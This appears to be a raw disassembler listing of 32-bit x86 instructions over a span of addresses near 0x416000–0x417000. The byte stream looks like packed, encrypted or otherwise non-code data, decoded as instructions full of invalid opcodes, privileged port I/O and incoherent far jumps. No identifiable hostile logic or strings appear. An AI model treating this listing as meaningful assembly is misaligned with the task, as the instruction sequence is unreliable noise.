  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi-0x17b04354]
  416601:	inc    ebp
  416602:	sbb    BYTE PTR [ecx+0x5e],0xec
  416606:	add    BYTE PTR [eax],al
  416608:	add    eax,0xd8000001
  41660d:	jp     0x41668d
  41660f:	inc    eax
  416611:	int3   
  416612:	xlat   BYTE PTR ds:[ebx]
  416613:	es aam 0x9
  416616:	jns    0x4165a5
  416618:	mov    WORD PTR [ecx-0x693961c6],gs
  41661e:	fiadd  WORD PTR [ebx+0x63504873]
  416624:	push   0x42
  416626:	lds    eax,FWORD PTR [ebp+0x2bedbd9f]
  41662c:	sbb    eax,0x1d5c33c4
  416631:	cmp    eax,DWORD PTR [ecx-0x11f8240e]
  416637:	or     DWORD PTR [eax],ebp
  416639:	aam    0x76
  41663b:	in     al,0xcc
  41663d:	add    DWORD PTR [edx+0x26],0x397cf361
  416644:	sbb    al,bh
  416646:	imul   ebp,ebp,0xffffff84
  416649:	xchg   ecx,eax
  41664a:	adc    BYTE PTR [eax-0x3c8adb39],al
  416650:	in     eax,dx
  416651:	int3   
  416652:	pop    edx
  416653:	dec    edi
  416654:	sar    BYTE PTR [ebp+0x2940630e],cl
  41665a:	mov    ds:0xa87b999,al
  41665f:	add    ch,BYTE PTR [ebx]
  416661:	fdivr  DWORD PTR [esi]
  416663:	sub    al,0xaa
  416665:	mov    esi,0xa4b299ce
  41666a:	hlt    
  41666b:	shrd   ecx,ebx,0xb3
  41666f:	mov    DWORD PTR [edi-0x3c30b3fe],eax
  416675:	daa    
  416676:	iret   
  416677:	retf   
  416678:	(bad)  
  416679:	mov    al,ds:0x5f6d45e2
  41667e:	aas    
  41667f:	inc    eax
  416680:	fisubr DWORD PTR [edi+0x2]
  416683:	push   es
  416684:	shl    BYTE PTR [ebx],cl
  416686:	jp     0x4166c6
  416688:	pushf  
  416689:	cmp    al,0x6b
  41668b:	fldcw  WORD PTR [ebx+0x64]
  41668e:	fdivr  QWORD PTR [ebp+0x32150efc]
  416694:	push   ds
  416695:	call   0x180b:0xb2cb7f12
  41669c:	xor    DWORD PTR [ebp+0x2ca46ceb],esp
  4166a2:	and    al,0x60
  4166a4:	mov    eax,ds:0xc0f25511
  4166a9:	lods   al,BYTE PTR ds:[esi]
  4166aa:	dec    esi
  4166ab:	and    ebp,DWORD PTR [edx]
  4166ad:	jbe    0x4166dc
  4166af:	xchg   esp,eax
  4166b0:	mov    edi,0xb7480198
  4166b5:	or     edi,DWORD PTR [edx+0x5123f734]
  4166bb:	pop    esp
  4166bc:	cld    
  4166bd:	ins    BYTE PTR es:[edi],dx
  4166be:	jmp    0x49bb:0x98b19ad7
  4166c5:	out    0x38,al
  4166c7:	lock jg 0x41667d
  4166ca:	test   al,0x33
  4166cc:	sbb    cl,BYTE PTR [edx-0x68]
  4166cf:	cmp    bh,BYTE PTR [ecx+0x21]
  4166d2:	mov    ds:0x461f586a,al
  4166d7:	or     BYTE PTR [eax+0x56edca28],0xfe
  4166de:	inc    edi
  4166df:	cmp    edi,DWORD PTR [ebx+0x1e]
  4166e2:	push   es
  4166e3:	outs   dx,BYTE PTR ds:[esi]
  4166e4:	dec    edx
  4166e5:	push   ds
  4166e6:	lods   eax,DWORD PTR ds:[esi]
  4166e7:	bound  ebx,QWORD PTR [ecx+eax*2-0x55ebe8a7]
  4166ee:	retf   0xaa2e
  4166f1:	xor    DWORD PTR [ebx-0x43],ebp
  4166f4:	jnp    0x41670f
  4166f6:	push   es
  4166f7:	aaa    
  4166f8:	repnz popf 
  4166fa:	cmp    ebx,edx
  4166fc:	adc    ah,dl
  4166fe:	push   eax
  4166ff:	ja     0x416721
  416701:	mov    esi,0xb527b476
  416706:	jno    0x4166c9
  416708:	adc    dl,ch
  41670a:	out    dx,al
  41670b:	cmp    DWORD PTR [ebx],0xb6b3d0b9
	...
  416771:	add    BYTE PTR [eax],al
  416773:	add    ah,al
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	ja     0x416744
  416782:	fnstcw WORD PTR [ecx+0x63]
  416785:	in     eax,dx
  416786:	add    BYTE PTR [eax],al
  416788:	add    eax,0x91000001
  41678d:	xchg   edx,eax
  41678e:	ins    DWORD PTR es:[edi],dx
  41678f:	sahf   
  416790:	add    ch,BYTE PTR [ebp-0x2b000ada]
  416796:	mov    eax,0xedbc2ab0
  41679b:	les    ebx,FWORD PTR [ebp-0x64]
  41679e:	pop    ecx
  41679f:	cmp    cl,BYTE PTR [edx-0x4e]
  4167a2:	jecxz  0x416801
  4167a4:	out    dx,al
  4167a5:	clc    
  4167a6:	xchg   esi,eax
  4167a7:	xchg   esp,eax
  4167a8:	dec    ebx
  4167a9:	jp     0x4167ea
  4167ab:	bound  esp,QWORD PTR [edi]
  4167ad:	adc    DWORD PTR [edx],ebp
  4167af:	inc    esp
  4167b0:	adc    cl,dh
  4167b2:	push   ss
  4167b3:	mov    edx,0x8b8b434d
  4167b8:	inc    esp
  4167b9:	inc    eax
  4167ba:	in     eax,0xc4
  4167bc:	out    0xc7,al
  4167be:	push   esp
  4167bf:	fs dec edi
  4167c1:	mov    dh,0x66
  4167c3:	sub    eax,0xdb9acc3d
  4167c8:	lea    eax,[esi+edx*4-0x49ffce4b]
  4167cf:	outs   dx,BYTE PTR ds:[esi]
  4167d0:	ror    esp,0x28
  4167d3:	jmp    0x9582:0xc31e7363
  4167da:	dec    ebx
  4167db:	pusha  
  4167dc:	aaa    
  4167dd:	mov    ecx,0xe5976b52
  4167e2:	call   0x4061:0x9391456b
  4167e9:	pop    ss
  4167ea:	imul   DWORD PTR [edx+0x62]
  4167ed:	cmp    BYTE PTR [eax+0x58],0xc8
  4167f1:	sbb    cl,BYTE PTR [edx-0xaa9939e]
  4167f7:	pop    edx
  4167f8:	mov    edi,0x4c4a8a22
  4167fd:	retf   
  4167fe:	jne    0x4167d2
  416800:	sahf   
  416801:	jmp    0x416833
  416803:	out    0xec,eax
  416805:	mov    ch,BYTE PTR [ebx+ecx*4+0x3e184e73]
  41680c:	scas   al,BYTE PTR es:[edi]
  41680d:	xchg   ebp,eax
  41680e:	xor    BYTE PTR [esi],dl
  416810:	popf   
  416811:	push   cs
  416812:	jmp    0x6f4e:0x4b1857a1
  416819:	push   ss
  41681a:	and    eax,0xc31a820
  41681f:	cwde   
  416820:	scas   eax,DWORD PTR es:[edi]
  416821:	jns    0x41687a
  416823:	mov    al,ds:0xc09cd195
  416828:	or     eax,0xb4458a8d
  41682d:	mov    bh,ch
  41682f:	out    dx,al
  416830:	mov    eax,0x2aca2cd5
  416835:	test   eax,0x176be7d8
  41683a:	sub    DWORD PTR [ecx-0x8913781],esp
  416840:	sbb    esp,eax
  416842:	(bad)  
  416844:	lahf   
  416845:	pushf  
  416846:	cmp    dh,BYTE PTR [ecx+0x33cc884c]
  41684c:	pop    ss
  41684d:	and    esp,DWORD PTR [ebx]
  41684f:	jnp    0x4167fb
  416851:	pop    esi
  416852:	and    eax,0x432fd9a5
  416857:	call   FWORD PTR [eax]
  416859:	mov    ah,0x74
  41685b:	scas   al,BYTE PTR es:[edi]
  41685c:	adc    ecx,DWORD PTR [si]
  41685f:	pop    ebp
  416860:	add    dl,dh
  416862:	or     dl,BYTE PTR [edx+0x7021362e]
  416868:	cmc    
  416869:	pop    ss
  41686a:	aam    0xb0
  41686c:	mov    dl,BYTE PTR [ebp-0x444ce83d]
  416872:	dec    edx
  416873:	and    DWORD PTR [bp+di-0x69],eax
  416877:	mov    esi,0x7e8ecf72
  41687c:	ss in  eax,0x83
  41687f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416880:	loopne 0x416829
  416882:	pop    es
  416883:	mov    ss,WORD PTR [eax+0x6c]
  416886:	push   edi
  416887:	mov    al,ds:0xb613fdc5
  41688c:	jo     0x4168f5
  41688e:	icebp  
  41688f:	dec    edi
  416890:	jmp    0x416895
	...
  4168f1:	add    BYTE PTR [eax],al
  4168f3:	add    cl,dl
  4168f5:	scas   eax,DWORD PTR es:[edi]
  4168f6:	push   es
  4168f7:	repz jle 0x4168f5
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0xd2d19eaa
  416904:	push   0x50000ee
  416909:	add    DWORD PTR [eax],eax
  41690b:	add    BYTE PTR [esi+0x62],dh
  41690e:	inc    ecx
  41690f:	(bad)  
  416910:	outs   dx,BYTE PTR ds:[esi]
  416911:	sti    
  416912:	cmc    
  416913:	add    esp,DWORD PTR [ebp-0x4b]
  416916:	pop    edx
  416917:	scas   eax,DWORD PTR es:[edi]
  416918:	mov    al,ds:0x283416fd
  41691d:	sbb    BYTE PTR [ebp-0x37183923],dl
  416923:	mov    edx,0xd5b82ad5
  416928:	arpl   si,di
  41692a:	mov    ebp,0xd69e4dc
  41692f:	mov    eax,edi
  416931:	add    DWORD PTR [edi+0x72a92721],0x1682722b
  41693b:	nop
  41693c:	bound  eax,QWORD PTR [ecx]
  41693e:	adc    al,0xe2
  416940:	cmp    al,dl
  416942:	cmp    al,BYTE PTR ds:0x517f5005
  416948:	sbb    al,0xde
  41694a:	lea    eax,[edi]
  41694c:	xor    al,0xd4
  41694e:	stos   BYTE PTR es:[edi],al
  41694f:	inc    edi
  416950:	or     DWORD PTR [edi],ecx
  416952:	fisttp QWORD PTR [edx+esi*1]
  416955:	dec    ebx
  416956:	dec    ebx
  416958:	fwait
  416959:	or     BYTE PTR [edx],ah
  41695b:	push   ds
  41695c:	popa   
  41695d:	(bad)  
  41695e:	imul   edx,DWORD PTR [ecx+eiz*1-0x2b63a6ca],0xffffff80
  416966:	cmpxchg ch,bh
  416969:	ss jecxz 0x4168ed
  41696c:	add    esi,ebp
  41696e:	push   esi
  41696f:	pop    edx
  416970:	inc    ebp
  416971:	or     cl,ah
  416973:	rcr    eax,0xf4
  416976:	adc    BYTE PTR [edx],dh
  416978:	inc    esp
  416979:	in     eax,dx
  41697a:	retf   
  41697b:	xchg   edi,eax
  41697c:	sub    al,0x9c
  41697e:	hlt    
  41697f:	pop    ebx
  416980:	(bad)  
  416981:	mov    dl,0xd1
  416983:	enter  0x87db,0xe4
  416987:	xchg   BYTE PTR [eax-0x46],al
  41698a:	xlat   BYTE PTR ds:[ebx]
  41698b:	out    dx,eax
  41698c:	ins    BYTE PTR es:[edi],dx
  41698d:	xchg   esp,eax
  41698e:	dec    edi
  41698f:	shl    BYTE PTR [edi],0x27
  416992:	dec    esi
  416993:	aas    
  416994:	test   BYTE PTR [ebp-0x3ba0ce5c],bh
  41699a:	les    ebx,FWORD PTR ds:0x8e81a9dd
  4169a0:	jl     0x416a03
  4169a2:	cmp    eax,DWORD PTR [edi-0x48f7f715]
  4169a8:	sub    dl,0xcc
  4169ab:	adc    al,0x2
  4169ad:	fwait
  4169ae:	mov    ebx,0xaccfb0e0
  4169b3:	mov    al,0x6e
  4169b5:	(bad)  
  4169b6:	jmp    0x56ba:0xb21729de
  4169bd:	fisub  WORD PTR [edx+ecx*8]
  4169c0:	push   0x3be06e5c
  4169c5:	xchg   esi,eax
  4169c6:	aam    0x5e
  4169c8:	jmp    0x4169e3
  4169ca:	and    dh,ah
  4169cc:	dec    esp
  4169cd:	jmp    0x9e26:0x65d70bc2
  4169d4:	jns    0x416963
  4169d6:	scas   eax,DWORD PTR es:[edi]
  4169d7:	dec    edx
  4169d8:	loope  0x416983
  4169da:	fisttp DWORD PTR [edi+0x19]
  4169dd:	sar    dh,0x5d
  4169e0:	int3   
  4169e1:	out    0x87,eax
  4169e3:	push   edi
  4169e4:	outs   dx,BYTE PTR ds:[esi]
  4169e5:	aaa    
  4169e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169e7:	es push cs
  4169e9:	outs   dx,DWORD PTR ds:[esi]
  4169ea:	sahf   
  4169eb:	mov    ebp,0xf795f67b
  4169f0:	mov    eax,ds:0x1bbc6b49
  4169f5:	pusha  
  4169f6:	lea    edx,[ebx+0x7dcf7b81]
  4169fc:	je     0x416a6d
  4169fe:	fwait
  4169ff:	bound  ebp,QWORD PTR [edi+0x7f]
  416a02:	js     0x416a60
  416a04:	ret    
  416a05:	fistp  WORD PTR [edi-0x3f]
  416a08:	int    0xdd
  416a0a:	(bad)  
  416a0b:	mov    esi,0xe84abad9
  416a10:	sbb    BYTE PTR [eax],al
	...
  416a72:	add    BYTE PTR [eax],al
  416a74:	retf   
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0x7a160ba3
  416a82:	aad    0xea
  416a84:	ins    DWORD PTR es:[edi],dx
  416a85:	out    dx,eax
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    eax,0x2c000001
  416a8d:	adc    bh,bh
  416a8f:	clc    
  416a90:	and    DWORD PTR [ebx-0x22e698b3],eax
  416a96:	or     ch,dl
  416a98:	fwait
  416a99:	add    ebp,DWORD PTR ds:0x1bd4bf8b
  416a9f:	adc    al,0x69
  416aa1:	sub    DWORD PTR [eax],esi
  416aa3:	out    0x22,eax
  416aa5:	leave  
  416aa6:	xchg   ebp,eax
  416aa7:	jl     0x416b20
  416aa9:	aas    
  416aaa:	rcr    ch,0x7a
  416aad:	cmc    
  416aae:	xchg   BYTE PTR [esi+0x33],dh
  416ab1:	fs mov bh,0x9c
  416ab4:	sub    eax,0xc0fffbe1
  416ab9:	xchg   ecx,eax
  416aba:	inc    ebx
  416abb:	jle    0x416ae9
  416abd:	mov    ss,edx
  416abf:	xor    BYTE PTR [esi+0x78],dh
  416ac2:	jecxz  0x416a84
  416ac4:	xchg   edi,eax
  416ac5:	fcomp  QWORD PTR [ecx+0xf1afd91]
  416acb:	mov    ebx,edi
  416acd:	cmp    al,0x57
  416acf:	adc    eax,0xa2e9240f
  416ad4:	repnz retf 
  416ad6:	test   eax,0x8f0df645
  416adb:	ret    0x4906
  416ade:	xor    ecx,edi
  416ae0:	xchg   ebx,eax
  416ae1:	mov    al,ds:0xa6526a4c
  416ae6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ae7:	ins    BYTE PTR es:[edi],dx
  416ae8:	dec    ebx
  416ae9:	xor    esp,DWORD PTR [ebx+0x6d81969]
  416aef:	mov    WORD PTR [ebp-0x600b7d38],gs
  416af5:	in     al,dx
  416af6:	inc    ebp
  416af7:	mov    edx,0x42ff85be
  416afc:	popa   
  416afd:	call   0x3b9ebec6
  416b02:	mov    bh,0x0
  416b04:	lahf   
  416b05:	cli    
  416b06:	out    0x6d,al
  416b08:	cli    
  416b09:	push   ebx
  416b0a:	fucom  st(7)
  416b0c:	femms  
  416b0e:	mov    DWORD PTR [ecx],0x8006efae
  416b14:	push   es
  416b15:	retf   
  416b16:	push   ss
  416b17:	repz arpl WORD PTR [edi-0x105d07e],bx
  416b1e:	dec    ecx
  416b1f:	mov    ebx,DWORD PTR [esi-0x4f04d21d]
  416b25:	or     al,0xb4
  416b27:	push   es
  416b28:	mov    edx,0x92d155d7
  416b2d:	aad    0xe0
  416b2f:	gs push ebp
  416b31:	jns    0x416acf
  416b33:	int    0xa
  416b35:	je     0x416b6c
  416b37:	adc    esp,ecx
  416b39:	cs in  al,dx
  416b3b:	aam    0xf1
  416b3d:	mov    ah,BYTE PTR gs:[ebp+0x5ee7ff3b]
  416b44:	dec    eax
  416b45:	pop    es
  416b46:	pop    ecx
  416b47:	ss ds in eax,dx
  416b4a:	or     eax,0xe4ef565
  416b4f:	fstp   TBYTE PTR [ebx*4+0x3ba4b96b]
  416b56:	sub    BYTE PTR [ecx],ah
  416b58:	(bad)  
  416b59:	test   DWORD PTR [eax-0x4234a907],0x2b57a844
  416b63:	add    esp,DWORD PTR [ebx-0x1951513b]
  416b69:	sahf   
  416b6a:	in     eax,0xc0
  416b6c:	call   0x4399a6b7
  416b71:	mov    BYTE PTR [ebx+0x187a9c36],bl
  416b77:	cmp    al,ah
  416b79:	ror    esi,1
  416b7b:	xor    eax,0xa4381b44
  416b80:	and    ch,BYTE PTR [eax-0x72]
  416b83:	repz fwait
  416b85:	loop   0x416b1a
  416b87:	jne    0x416bf4
  416b89:	jo     0x416b77
  416b8b:	mov    eax,ds:0x91a2c03b
  416b90:	mov    edi,0x0
	...
  416bf1:	add    BYTE PTR [eax],al
  416bf3:	add    bl,ah
  416bf5:	gs push cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0x4f5b70a9
  416c01:	xchg   edx,eax
  416c02:	and    al,BYTE PTR [edx+0xf072]
  416c08:	add    eax,0x6f000001
  416c0d:	and    dh,0x6d
  416c10:	icebp  
  416c11:	iret   
  416c12:	sbb    dh,cl
  416c14:	loopne 0x416c73
  416c16:	sahf   
  416c17:	xchg   edi,eax
  416c18:	pop    es
  416c19:	pop    esp
  416c1a:	sbb    BYTE PTR [edi],dl
  416c1c:	or     al,0x4d
  416c1e:	pushf  
  416c1f:	nop
  416c20:	out    0x7,al
  416c22:	add    eax,0x891d4070
  416c27:	mov    bl,0x8d
  416c29:	pop    ecx
  416c2a:	outs   dx,BYTE PTR ds:[esi]
  416c2b:	mov    ecx,0x6e4b802f
  416c30:	mov    ch,0xa0
  416c32:	xor    BYTE PTR [edi],0x11
  416c35:	mov    WORD PTR [edi+0x208055e8],cs
  416c3b:	cli    
  416c3c:	pop    es
  416c3d:	jmp    0xc2fbccd6
  416c42:	sbb    BYTE PTR [ebx-0x1742c07],bl
  416c48:	sbb    al,0x55
  416c4a:	leave  
  416c4b:	mov    WORD PTR [edx+edi*4-0x695a4da5],gs
  416c52:	cmp    BYTE PTR [edx-0x76b9998f],bl
  416c58:	sub    DWORD PTR [esi+0x4f],ebp
  416c5b:	xchg   edx,eax
  416c5c:	lahf   
  416c5d:	xchg   DWORD PTR [edx],ecx
  416c5f:	adc    BYTE PTR [ecx+0x49],dh
  416c62:	and    al,0x5a
  416c64:	pop    ds
  416c65:	xor    al,0x6b
  416c67:	imul   esi,DWORD PTR [edx],0xffffffe8
  416c6a:	bound  eax,QWORD PTR [ebp+0x7609feef]
  416c70:	xchg   ebx,eax
  416c71:	outs   dx,BYTE PTR ds:[esi]
  416c72:	or     BYTE PTR [eax+ebp*4],al
  416c75:	mov    ebp,0x4e9e44c0
  416c7a:	adc    DWORD PTR [ecx+0x3b],ecx
  416c7d:	pop    ebx
  416c7e:	shl    DWORD PTR [eax+ebp*2],0xde
  416c82:	call   0x9304:0x2e0d400b
  416c89:	mov    ?,WORD PTR [esi+0x35c504b2]
  416c8f:	pushf  
  416c90:	test   eax,0xcb359a15
  416c95:	in     al,0x81
  416c97:	sub    DWORD PTR [edi*1-0x20e7424c],ebp
  416c9e:	sbb    eax,0xe6c84de8
  416ca3:	add    eax,0xfb935499
  416ca8:	adc    edi,DWORD PTR [edi+0x7868e796]
  416cae:	std    
  416caf:	and    bh,BYTE PTR ds:0x3fb53cf6
  416cb5:	out    dx,eax
  416cb6:	daa    
  416cb7:	gs mov ebp,0x5bb263a0
  416cbd:	and    ebx,DWORD PTR [ecx+ecx*2-0x2d]
  416cc1:	jp     0x416c83
  416cc3:	pop    eax
  416cc4:	std    
  416cc5:	jb     0x416d1c
  416cc7:	sahf   
  416cc8:	imul   edi,DWORD PTR [edx],0xdf216377
  416cce:	push   edx
  416ccf:	xor    DWORD PTR [ebx+0x79],ebx
  416cd2:	test   al,0x98
  416cd4:	dec    eax
  416cd5:	push   ecx
  416cd6:	jne    0x416d3b
  416cd8:	scas   eax,DWORD PTR es:[edi]
  416cd9:	mov    ds:0xd8c173ce,al
  416cde:	mov    esi,0x8bd5ea0d
  416ce3:	or     BYTE PTR [edx],bl
  416ce5:	xchg   ebp,eax
  416ce6:	or     BYTE PTR [ebx-0x32],bl
  416ce9:	test   al,0xd8
  416ceb:	cmp    ebp,0xb
  416cee:	and    BYTE PTR [ebp-0x70],0xed
  416cf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cf3:	adc    eax,0x6eaef48b
  416cf8:	adc    ecx,0xffffffcc
  416cfb:	sbb    edi,DWORD PTR [esi]
  416cfd:	scas   al,BYTE PTR es:[edi]
  416cfe:	retf   
  416cff:	jbe    0x416cd6
  416d01:	test   DWORD PTR [esi+0x9094ebf],0x41013fd8
  416d0b:	dec    ecx
  416d0c:	fs cs mov ah,0x5e
  416d10:	bound  eax,QWORD PTR [eax]
	...
  416d72:	add    BYTE PTR [eax],al
  416d74:	and    DWORD PTR [ebx-0x40445077],edx
  416d7a:	daa    
  416d7b:	lahf   
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	imul   ebp,DWORD PTR [esp+esi*1+0xf177a2],0x10500
  416d8b:	add    BYTE PTR [eax+eax*2-0x264cb63a],dl
  416d92:	pop    ds
  416d93:	mov    dl,0x70
  416d95:	les    edx,FWORD PTR [esi]
  416d97:	jle    0x416d7b
  416d99:	xor    BYTE PTR ds:0xa21f1c57,cl
  416d9f:	push   eax
  416da0:	cmp    BYTE PTR [ebx+0x2e],bl
  416da3:	or     DWORD PTR [edx],edx
  416da5:	inc    esp
  416da6:	add    cl,BYTE PTR [ebp-0x4a]
  416da9:	sbb    DWORD PTR [esi-0x392620fd],eax
  416daf:	aaa    
  416db0:	jge    0x416dc4
  416db2:	add    al,0xb5
  416db4:	cmc    
  416db5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416db6:	mov    dh,0x95
  416db8:	sti    
  416db9:	lock test eax,0xd102cff7
  416dbf:	and    esi,DWORD PTR [di]
  416dc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416dc3:	mov    cl,0xd4
  416dc5:	jne    0x416db3
  416dc7:	jecxz  0x416dc3
  416dc9:	xchg   edi,eax
  416dca:	hlt    
  416dcb:	add    al,cl
  416dcd:	mov    DWORD PTR [bp+0x25],eax
  416dd1:	lods   al,BYTE PTR ds:[esi]
  416dd2:	inc    eax
  416dd3:	add    DWORD PTR [edx-0x4],ebx
  416dd6:	mov    ebp,0xe21eb6bf
  416ddb:	outs   dx,BYTE PTR ds:[esi]
  416ddc:	inc    edi
  416ddd:	push   ds
  416dde:	xor    dl,BYTE PTR [ecx-0x61453ed3]
  416de4:	and    eax,0xb07b3cf8
  416de9:	push   esp
  416dea:	cmp    DWORD PTR [edi],ecx
  416dec:	(bad)  
  416ded:	out    dx,eax
  416dee:	rcl    DWORD PTR [eax],1
  416df0:	jo     0x416dfb
  416df2:	xor    edi,DWORD PTR ds:0x1a2c5a63
  416df8:	addr16 dec ecx
  416dfa:	mov    cl,0x6b
  416dfc:	in     eax,dx
  416dfd:	mov    bl,0x3e
  416dff:	aam    0xfb
  416e01:	xor    esi,DWORD PTR [edi+ecx*4+0x72fcc6e5]
  416e08:	rol    DWORD PTR [edi],0x3c
  416e0b:	ss push ebp
  416e0d:	xor    BYTE PTR [ebx+0x1b337bd],0xe6
  416e14:	pop    ss
  416e15:	mov    ds:0x8f636561,eax
  416e1a:	cdq    
  416e1b:	dec    eax
  416e1c:	jp     0x416e7f
  416e1e:	mov    ah,0x3c
  416e20:	sbb    DWORD PTR [ecx],0xd536b907
  416e26:	jge    0x416dc9
  416e28:	mov    dh,0x76
  416e2a:	js     0x416dc9
  416e2c:	mov    ah,0xae
  416e2e:	or     DWORD PTR [ebp-0x19],0x4
  416e32:	sbb    al,0xe9
  416e34:	mov    eax,0xe33cfb22
  416e39:	repnz icebp 
  416e3b:	dec    edi
  416e3c:	jo     0x416de9
  416e3e:	jo     0x416e59
  416e40:	adc    ecx,ebx
  416e42:	sbb    dh,BYTE PTR [edx+ebp*8-0x32]
  416e46:	lds    ecx,FWORD PTR [esi]
  416e48:	das    
  416e49:	sbb    BYTE PTR [ebx],bh
  416e4b:	je     0x416e7a
  416e4d:	inc    ebp
  416e4e:	scas   eax,DWORD PTR es:[edi]
  416e4f:	sbb    eax,0xe68956d2
  416e54:	jns    0x416eab
  416e56:	ret    0x3b9a
  416e59:	cmp    eax,0x95c58011
  416e5e:	imul   esi,esp,0x27
  416e61:	das    
  416e62:	in     al,0x9e
  416e64:	dec    edi
  416e65:	jns    0x416e6e
  416e67:	mul    cl
  416e69:	clc    
  416e6a:	(bad)  
  416e6b:	ins    BYTE PTR es:[edi],dx
  416e6c:	stos   DWORD PTR es:[edi],eax
  416e6d:	iret   
  416e6e:	lock test BYTE PTR [esi+0x13],ah
  416e72:	cwde   
  416e73:	fstp   DWORD PTR [esi+edi*8-0x4df3bab5]
  416e7a:	xchg   edi,eax
  416e7b:	xchg   edx,eax
  416e7c:	popa   
  416e7d:	xchg   DWORD PTR [edx+eiz*4],esp
  416e80:	add    al,0xb7
  416e83:	mov    eax,ds:0xf750b088
  416e88:	in     al,0x35
  416e8a:	adc    eax,0xb8616c33
  416e8f:	out    0xce,eax
	...
  416ef1:	add    BYTE PTR [eax],al
  416ef3:	add    BYTE PTR [edi-0x519271e7],bh
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0xe5cf8eea
  416f02:	push   0xf27cc1
  416f07:	add    BYTE PTR ds:0xb8000001,al
  416f0d:	ins    DWORD PTR es:[edi],dx
  416f0e:	or     DWORD PTR [edx+ecx*4],eax
  416f11:	fwait
  416f12:	test   al,0x25
  416f14:	loop   0x416e9b
  416f16:	push   eax
  416f17:	xchg   esp,eax
  416f18:	ja     0x416eae
  416f1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f1b:	add    al,0x11
  416f1d:	pop    es
  416f1e:	es dec esi
  416f20:	fild   WORD PTR [eax+0x54ad857e]
  416f26:	or     edx,ebx
  416f28:	or     bl,BYTE PTR [esi+0x47]
  416f2b:	aaa    
  416f2c:	and    al,0xdb
  416f2e:	mov    esp,0x410deeaa
  416f33:	fsub   DWORD PTR [eax-0x31]
  416f36:	cld    
  416f37:	mov    dh,BYTE PTR [ecx]
  416f39:	push   cs
  416f3a:	adc    al,0x74
  416f3c:	out    0x3,eax
  416f3e:	xor    cl,cl
  416f40:	jno    0x416f4b
  416f42:	push   ebp
  416f43:	ins    DWORD PTR es:[edi],dx
  416f44:	mov    eax,0xa3cec02b
  416f49:	push   esp
  416f4a:	out    dx,eax
  416f4b:	xor    al,bl
  416f4d:	lods   al,BYTE PTR ds:[esi]
  416f4e:	in     al,0x10
  416f50:	jns    0x416efd
  416f52:	add    al,0x7e
  416f54:	std    
  416f55:	dec    ecx
  416f56:	pop    ebp
  416f57:	stos   BYTE PTR es:[edi],al
  416f58:	cwde   
  416f59:	mov    ebp,0xc1a879c0
  416f5e:	xchg   ebp,eax
  416f5f:	xchg   ebp,eax
  416f60:	pushf  
  416f61:	dec    esp
  416f62:	dec    edx
  416f63:	lahf   
  416f64:	mov    al,0xee
  416f66:	cpuid  
  416f68:	dec    eax
  416f69:	adc    eax,0x32aef493
  416f6e:	cmp    ebx,DWORD PTR [edx-0xb]
  416f71:	repz sbb BYTE PTR [ebp-0x1fbff5f],ch
  416f78:	jnp    0x416fbe
  416f7a:	ins    BYTE PTR es:[edi],dx
  416f7b:	icebp  
  416f7c:	push   ebp
  416f7d:	neg    BYTE PTR [eax+0x36]
  416f80:	or     bh,BYTE PTR [ecx]
  416f82:	dec    BYTE PTR [ecx+0x31]
  416f85:	mov    DWORD PTR [eax-0x571b00b],ebp
  416f8b:	fsub   QWORD PTR [eax-0x70bf91cc]
  416f91:	fwait
  416f92:	jecxz  0x416f25
  416f94:	mov    ecx,0x4b017163
  416f99:	cwde   
  416f9a:	rcr    al,1
  416f9c:	fstp   TBYTE PTR [edx+esi*2+0x30]
  416fa0:	sti    
  416fa1:	mov    ah,0x5e
  416fa3:	fmulp  st(6),st
  416fa5:	or     bh,bl
  416fa7:	mov    bl,0x7d
  416fa9:	and    eax,esi
  416fab:	cmp    DWORD PTR gs:[edi+0x1a751a7],edx
  416fb2:	mov    edi,0x41971ca1
  416fb7:	sub    edi,DWORD PTR [edi+0x2401e333]
  416fbd:	sbb    dh,al
  416fbf:	sti    
  416fc0:	lods   eax,DWORD PTR ds:[esi]
  416fc1:	push   edx
  416fc2:	or     bh,dh
  416fc4:	repz das 
  416fc6:	or     al,BYTE PTR [edi]
  416fc8:	pop    eax
  416fc9:	and    DWORD PTR [edi+0x6d],esp
  416fcc:	xchg   ebp,eax
  416fcd:	out    dx,al
  416fce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fcf:	dec    esp
  416fd0:	sub    ah,ch
  416fd2:	xor    esp,edi
  416fd4:	xchg   ecx,eax
  416fd5:	lds    edi,FWORD PTR [edx+0x38f01441]
  416fdb:	add    DWORD PTR [ebp+0x5e],esp
  416fde:	loope  0x417057
  416fe0:	aad    0xbc
  416fe2:	adc    eax,DWORD PTR [edi-0x759cad5]
  416fe8:	adc    eax,0xe448d57a
  416fed:	pushf  
  416fee:	inc    edi
  416fef:	hlt    
  416ff0:	iret   
  416ff1:	lahf   
  416ff2:	adc    BYTE PTR [edi-0x1ae9387e],bl
  416ff8:	jb     0x41705f
  416ffa:	test   DWORD PTR ds:0xe5aff104,eax
  417000:	jae    0x417070
  417002:	push   eax
  417003:	mov    al,0xe1
  417005:	add    cl,al
  417007:	pop    esp
  417008:	xor    BYTE PTR [esi],cl
  41700a:	out    dx,al
  41700b:	jl     0x417052
  41700d:	jp     0x41700e
  41700f:	lods   al,BYTE PTR ds:[esi]
  417010:	xchg   ebp,eax
	...
  417071:	add    BYTE PTR [eax],al
  417073:	add    BYTE PTR [esi+0x2d],dh
